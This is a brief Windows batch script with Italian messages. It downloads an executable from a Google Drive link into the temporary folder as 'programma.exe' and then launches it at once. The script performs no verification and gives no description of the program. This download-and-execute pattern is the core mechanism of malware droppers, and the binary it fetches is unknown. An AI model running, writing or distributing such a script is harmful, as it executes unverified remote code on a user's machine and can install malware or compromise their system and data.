@echo off
setlocal

set "URL=https://drive.usercontent.google.com/download?id=13tEr3j49GfjZUz1k2pscVShVvxdFAree&export=download&authuser=0&confirm=t&uuid=05dbc5c0-edad-4d0e-8f04-6411331c615c&at=AMrWOn16Rz2cT3MLWL8GF8cBWKMi:1794079314495"
set "FILE=%TEMP%\programma.exe"

echo Download in corso...

curl -L "%URL%" -o "%FILE%"

if errorlevel 1 (
    echo Errore durante il download!
    pause
    exit /b 1
)

if not exist "%FILE%" (
    echo File non trovato!
    pause
    exit /b 1
)

echo Download completato!
echo Avvio programma...

start "" "%FILE%"

exit /b
